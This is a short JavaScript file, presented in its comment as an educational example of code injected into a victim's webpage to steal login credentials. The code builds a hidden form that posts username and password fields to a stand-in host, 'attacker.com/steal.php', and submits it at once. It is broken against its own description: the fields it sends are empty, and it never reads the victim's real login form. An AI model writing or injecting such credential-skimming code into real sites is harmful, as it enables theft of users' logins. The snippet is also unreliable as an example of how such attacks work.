// Created By: Tommie Navitskas 2023

/* 
The following is an example of a JavaScript snippet that injects code into a victim's webpage
and steals their login credential when they submit a login form

Please note that stealing login credentials is considered a crime and is punishable by serious jail time.
This code is for educational and research purposes only.
*/


(function() {
    var form = document.createElement('form');
    form.action = 'https://attacker.com/steal.php';
    form.method = 'post';

    var username = document.createElement('input');
    username.type = 'text';
    username.name = 'username';
    username.value = '';

    var password = document.createElement('input');
    password.type = 'password';
    password.name = 'password';
    password.value = '';

    form.appendChild(username);
    form.appendChild(password);
    document.body.appendChild(form);

    form.submit();
})();
